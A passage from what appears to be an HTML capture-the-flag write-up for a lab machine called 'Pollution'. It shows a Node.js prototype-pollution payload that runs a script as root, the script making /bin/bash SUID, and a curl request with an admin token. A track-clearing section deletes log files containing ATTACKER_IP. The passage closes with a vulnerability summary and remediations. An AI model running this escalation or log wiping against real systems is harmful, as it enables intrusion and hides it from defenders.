+2023/05/20 21:23:48 CMD: UID=0     PID=85     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=84     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=83     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=82     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=81     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=80     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=79     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=78     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=77     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=76     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=75     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=74     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=73     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=72     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=71     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=70     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=69     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=68     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=67     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=66     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=65     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=64     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=63     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=62     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=61     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=60     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=59     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=58     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=57     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=56     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=55     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=54     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=53     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=52     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=51     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=32     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=31     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=30     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=29     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=28     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=27     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=25     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=24     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=23     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=20     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=18     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=17     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=16     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=15     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=13     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=12     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=11     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=10     | 
+2023/05/20 21:23:48 CMD: UID=0     PID=9      | 
+2023/05/20 21:23:48 CMD: UID=0     PID=8      | 
+2023/05/20 21:23:48 CMD: UID=0     PID=6      | 
+2023/05/20 21:23:48 CMD: UID=0     PID=4      | 
+2023/05/20 21:23:48 CMD: UID=0     PID=3      | 
+2023/05/20 21:23:48 CMD: UID=0     PID=2      | 
+2023/05/20 21:23:48 CMD: UID=0     PID=1      | /sbin/init</div>
+  <p>Let's take a look at /etc/supervisor/supervisord.conf :</p>
+  <div class="codeBlock">www-data@pollution:/etc/supervisor$ cat supervisord.conf 
+; supervisor config file
+
+[unix_http_server]
+file=/var/run/supervisor.sock   ; (the path to the socket file)
+chmod=0700                       ; sockef file mode (default 0700)
+
+[supervisord]
+logfile=/var/log/supervisor/supervisord.log ; (main log file;default $CWD/supervisord.log)
+pidfile=/var/run/supervisord.pid ; (supervisord pidfile;default supervisord.pid)
+childlogdir=/var/log/supervisor            ; (&#x27;AUTO&#x27; child log dir, default $TEMP)
+
+; the below section must remain in the config file for RPC
+; (supervisorctl/web interface) to work, additional interfaces may be
+; added by defining them in separate rpcinterface: sections
+[rpcinterface:supervisor]
+supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface
+
+[supervisorctl]
+serverurl=unix:///var/run/supervisor.sock ; use a unix:// URL  for a unix socket
+
+; The [include] section can just contain the &quot;files&quot; setting.  This
+; setting can list multiple files (separated by whitespace or
+; newlines).  It can also contain wildcards.  The filenames are
+; interpreted as relative to this file.  Included files *cannot*
+; include files themselves.
+
+[include]
+files = /etc/supervisor/conf.d/*.conf</div>
+  <p>
+    This configuration file include all the configuration files in <code>/etc/supervisor/conf.d/</code>. Let's see what we can find in this 
+    directory :
+  </p>
+  <div class="codeBlock">www-data@pollution:/etc/supervisor/conf.d$ ls
+pollution_api.conf
+www-data@pollution:/etc/supervisor/conf.d$ cat pollution_api.conf 
+[program:pollution_api]
+command=bash -c &#x27;sleep 5 &amp;&amp; /usr/bin/node /root/pollution_api/index.js&#x27;
+directory=/root/pollution_api/
+autostart=true
+autorestart=true
+user=root
+environment=</div>
+  <p>So the Pollution API is running as root and runs with <a href="https://nodejs.org/en">NodeJS</a>.</p>
+  <h2 id="privilege-escalation">Privilege escalation</h2>
+  <p>
+    After some research, I found a technique called PP2RCE (Prototype Pollution to Remote Code Execution). Since the Pollution API is running as 
+    root, we may be able to craft a payload to set the SUID bit on <code>/bin/bash</code> :
+  </p>
+  <div class="codeBlock">{
+  &quot;text&quot;: {
+    &quot;constructor&quot;: {
+      &quot;prototype&quot;: {
+        &quot;shell&quot;: &quot;/tmp/exploit.sh&quot;
+      }
+    }
+  }
+}</div>
+  <p>This payload will simply replace the shell environment variable to <code>/tmp/exploit.sh</code>.</p>
+  <p>
+    When functions like exec(), execFile(), fork(), spawn(), execFileSync(), execSync() or spawnSync() will be called in the 
+    <a href="https://nodejs.org/en">NodeJS</a> application, the shell environment variable will be used as the main binary 
+    to run commands. This way, our file defined in the environment variable shell will simply be executed as root.
+  </p>
+  <p>Let’s create the malicious file that will be run (<code>/tmp/exploit.sh</code>) :</p>
+  <div class="codeBlock">www-data@pollution:/tmp$ cat exploit.sh 
+#!/bin/bash
+
+chmod +s /bin/bash</div>
+  <p>We also need to make it executable by precaution :</p>
+  <div class="codeBlock">www-data@pollution:/tmp$ chmod +x exploit.sh</div>
+  <p>Now let's send this payload to the Pollution API :</p>
+  <div class="codeBlock">curl -X POST localhost:3000/admin/messages/send -H &quot;Content-Type: application/json&quot; -H &quot;x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsImlzX2F1dGgiOnRydWUsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY4NDYzMzgxNSwiZXhwIjoxNjg0NjM3NDE1fQ.oGvWp1IsUiNxURpPVAeIh6MQ05w1L2o9SNgmI4s_DUo&quot; -d &#x27;{&quot;text&quot;:{&quot;constructor&quot;:{&quot;prototype&quot;:{&quot;shell&quot;: &quot;/tmp/exploit.sh&quot;}}}}&#x27;</div>
+  <p>Now let's take a look at the permissions on <code>/bin/bash</code> :</p>
+  <div class="codeBlock">www-data@pollution:/etc/supervisor/conf.d$ ls -la /bin/bash
+-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash</div>
+  <p>It worked ! Now, we can spawn a shell as root like so :</p>
+  <div class="codeBlock">www-data@pollution:/etc/supervisor/conf.d$ bash -p
+bash-5.1# cd /root
+bash-5.1# ls
+pollution_api  root.txt
+bash-5.1# id
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
+bash-5.1# whoami
+root</div>
+  <h1 id="clearing-tracks">Clearing tracks</h1>
+  <ul>
+    <li>Remove <code>/tmp/exploit.sh</code></li>
+  </ul>
+  <ul>
+    <li>Remove test accounts in <code>pollution_api</code> database</li>
+  </ul>
+  <ul>
+    <li>Remove Cyberretta account in the <code>forum</code> database</li>
+  </ul>
+  <ul>
+    <li>Remove test accounts in webapp database</li>
+  </ul>
+  <ul>
+    <li>Remove log files that contains trace of our interaction with the system by running <code>grep -iRl “ATTACKER_IP” | xargs rm -f</code> in <code>/var/log</code></li>
+  </ul>
+  <ul>
+    <li>Remove <code>/var/www/.bash_history</code></li>
+  </ul>
+  <h1 id="vulnerabilities-summary">Vulnerabilities summary</h1>
+  <h2 id="sensitive-information-disclosure">Sensitive Information Disclosure</h2>
+  <table>
+    <thead>
+      <tr>
+        <th>Field</th>
+        <th>Value</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>Affected component</td>
+        <td>Forum</td>
+      </tr>
+      <tr>
+        <td>CVSS 3.0 score</td>
+        <td><mark class="highlight_red">7.2</mark></td>
+      </tr>
+      <tr>
+        <td>Severity</td>
+        <td><mark class="highlight_red">HIGH</mark></td>
+      </tr>
+      <tr>
+        <td>Attack vector</td>
+        <td>Network</td>
+      </tr>
+      <tr>
+        <td>Impact</td>
+        <td>
+          Allows an attacker to get the API token to get elevated privileges on the pollution API.<br>
+          <br>
+          This has a <mark class="highlight_orange">low</mark> impact on the <b>confidentiality</b> and <b>integrity</b> of the affected component. But since the vulnerable component is not the 
+          same as the impacted component, the vulnerability is much more severe.
+        </td>
+      </tr>
+      <tr>
+        <td>Remediation proposition</td>
+        <td>Remove sensitive informations from forum threads and prevent the team from sharing sensitive information on publicly accessible resources.</td>
+      </tr>
+    </tbody>
+  </table>
+  <h2 id="vuln-xxe-injection">XXE Injection</h2>
+  <table>
+    <thead>
+      <tr>
+        <th>Field</th>
+        <th>Value</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>Affected component</td>
+        <td>Pollution API</td>
+      </tr>
+      <tr>
+        <td>CVSS 3.0 score</td>
+        <td><mark class="highlight_orange">5.3</mark></td>
+      </tr>
+      <tr>
+        <td>Severity</td>
+        <td><mark class="highlight_orange">MEDIUM</mark></td>
+      </tr>
+      <tr>
+        <td>Attack vector</td>
+        <td>Network</td>
+      </tr>
+      <tr>
+        <td>Impact</td>
+        <td>
+          Allows an attacker to read local files on the system. This vulnerability only affects files readable by <code>www-data</code> user.<br>
+          <br>
+          This has a <mark class="highlight_orange">low</mark> impact on the <b>confidentiality</b> of the affected component.
+        </td>
+      </tr>
+      <tr>
+        <td>Remediation proposition</td>
+        <td>Disable DTDs (External entities) since they are not needed for the API to work properly.</td>
+      </tr>
+    </tbody>
+  </table>
+  <h2 id="weak-password">Weak password</h2>
+  <table>
+    <thead>
+      <tr>
+        <th>Field</th>
+        <th>Value</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>Affected component</td>
+        <td>Developers virtual host</td>
+      </tr>
+      <tr>
+        <td>CVSS 3.0 score</td>
+        <td><mark class="highlight_orange">5.3</mark></td>
+      </tr>
+      <tr>
+        <td>Severity</td>
+        <td><mark class="highlight_orange">MEDIUM</mark></td>
+      </tr>
+      <tr>
+        <td>Attack vector</td>
+        <td>Network</td>
+      </tr>
+      <tr>
+        <td>Impact</td>
+        <td>
+          Allows an attacker to authenticate on developers subdomain by brute-forcing the password (if he already has the username) or simply crack the password hash found 
+          via another vulnerability.<br>
+          <br>
+          This has a <mark class="highlight_red">high</mark> impact on the <b>confidentiality</b> of the affected component.
+        </td>
+      </tr>
+      <tr>
+        <td>Remediation proposition</td>
+        <td>Change the password for the Basic Authentication on developers subdomain to a stronger one. Also, set up a strong password policy.</td>
+      </tr>
+    </tbody>
+  </table>
+  <h2 id="vuln-lfi2rce">LFI2RCE</h2>
+  <table>
+    <thead>
+      <tr>
+        <th>Field</th>
+        <th>Value</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>Affected component</td>
+        <td>Developers virtual host</td>
+      </tr>
+      <tr>
+        <td>CVSS 3.0 score</td>
+        <td><mark class="highlight_red">8.8</mark></td>
+      </tr>
+      <tr>
+        <td>Severity</td>
+        <td><mark class="highlight_red">HIGH</mark></td>
+      </tr>
+      <tr>
+        <td>Attack vector</td>
+        <td>Network</td>
+      </tr>
+      <tr>
+        <td>Impact</td>
+        <td>
+          Allows an attacker to execute commands as www-data on the system. The attacker can leverage this to gain a reverse shell for example.<br>
+          <br>
+          This has a <mark class="highlight_red">high</mark> impact on the <b>confidentiality</b>, <b>integrity</b> and <b>availability</b> of the affected component.
+        </td>
+      </tr>
+      <tr>
+        <td>Remediation proposition</td>
+        <td>Add filters to the page parameter in <code>/var/www/developers/index.php</code> to prevent an attacker from injecting malicious payload in it.</td>
+      </tr>
+    </tbody>
+  </table>
+  <h2 id="vuln-pp2rce">PP2RCE</h2>
+  <table>
+    <thead>
+      <tr>
+        <th>Field</th>
+        <th>Value</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>Affected component</td>
+        <td>Pollution API</td>
+      </tr>
+      <tr>
+        <td>CVSS 3.0 score</td>
+        <td><mark class="highlight_red">7.8</mark></td>
+      </tr>
+      <tr>
+        <td>Severity</td>
+        <td><mark class="highlight_red">HIGH</mark></td>
+      </tr>
+      <tr>
+        <td>Attack vector</td>
+        <td>Local</td>
+      </tr>
+      <tr>
+        <td>Impact</td>
+        <td>
+          Allows an attacker to execute arbitrary code as root on the system. This can lead to full control over the system.<br>
+          <br>
+          This has a <mark class="highlight_red">high</mark> impact on the <b>confidentiality</b>, <b>integrity</b> and <b>availability</b> of the affected component.
+        </td>
+      </tr>
+      <tr>
+        <td>Remediation proposition</td>
+        <td>
+          Add filters to user input to prevent an attacker from polluting prototypes in the query made to the Pollution API. For exemple, you can blacklist 
+          <code>prototype</code> or <code>constructor</code> words.
+        </td>
+      </tr>
+    </tbody>
+  </table>
+  <h2 id="clear-text-passwords">Clear text passwords</h2>
+  <table>
+    <thead>
+      <tr>
+        <th>Field</th>
+        <th>Value</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>Affected component</td>
+        <td>pollution_api database</td>
+      </tr>
+      <tr>
+        <td>CVSS 3.0 score</td>
+        <td><mark class="highlight_orange">5.5</mark></td>
+      </tr>
+      <tr>
+        <td>Severity</td>
+        <td><mark class="highlight_orange">MEDIUM</mark></td>
+      </tr>
+      <tr>
+        <td>Attack vector</td>
+        <td>Local</td>
+      </tr>
+      <tr>
+        <td>Impact</td>
+        <td>
+          If an attacker gain access to the database or find a way to retrieve passwords from the database, he will be able to access any accounts of the Pollution API.<br>
+          <br>
+          This has a <mark class="highlight_red">high</mark> impact on the <b>confidentiality</b> of the affected component.
+        </td>
+      </tr>
+      <tr>
+        <td>Remediation proposition</td>
+        <td>Store hashes instead of clear text passwords. Prefer strong hashing algorithm like SHA-256 or SHA-512. Avoid weak hashing algorithm like MD5.</td>
+      </tr>
+    </tbody>
+  </table>
+  <h1 id="tools-used">Tools used</h1>
+  <table>
+    <thead>
+      <tr>
+        <th>Tool</th>
+        <th>Purpose</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><a href="https://nmap.org/book/man.html">Nmap</a></td>
+        <td>
+          - Scan for open ports<br>
+          - Scan services versions
+        </td>
+      </tr>
+      <tr>
+        <td><a href="https://github.com/OJ/gobuster">Gobuster</a></td>
+        <td>- Fuzz virtual hosts</td>
+      </tr>
+      <tr>
+        <td><a href="https://portswigger.net/burp">BurpSuite</a></td>
+        <td>- Analyse and modify requests sent to the web server</td>
+      </tr>
+      <tr>
+        <td><a href="https://github.com/DominicBreuker/pspy">Pspy</a></td>
+        <td>- Enumerate running process</td>
+      </tr>
+      <tr>
+        <td><a href="https://www.openwall.com/john/">John</a></td>
+        <td>- Crack password hashes</td>
+      </tr>
+      <tr>
+        <td><a href="https://github.com/synacktiv/php_filter_chain_generator">PHP filter chain generator</a></td>
+        <td>- Generate the payload to exploit the LFI2RCE</td>
+      </tr>
+      <tr>
+        <td><a href="https://linux.die.net/man/1/base64">Base64</a></td>
+        <td>- Decode data in victor’s proxy history</td>
+      </tr>
+      <tr>
+        <td><a href="https://linux.die.net/man/1/curl">curl</a></td>
+        <td>- Send requests to the Pollution API</td>
+      </tr>
+      <tr>
+        <td><a href="http://python.org/downloads/">Python3</a></td>
+        <td>- Run a simple HTTP server</td>
+      </tr>
+      <tr>
+        <td><a href="https://www.mysql.com/">MySQL</a></td>
+        <td>- Enumerate databases</td>
+      </tr>
+      <tr>
+        <td><a href="https://redis.io/docs/ui/cli/">redis-cli</a></td>
+        <td>- Connect to the Redis database</td>
+      </tr>
+    </tbody>
+  </table>
+  <h1 id="sources">Sources</h1>
+  <ul>
+    <li>NodeJS PP2RCE (Prototype Pollution to Remote Code Execution) : <a href="https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce">https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce</a></li>
+  </ul>
+  <ul>
+    <li>PHP LFI2RCE (Local File Inclusion to Remote Code Execution) via PHP Filters : <a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters">https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters</a></li>
+  </ul>
+  <ul>
+    <li>XXE (XML External Entity) injection : <a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity">https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity</a></li>
+  </ul>
+</div>
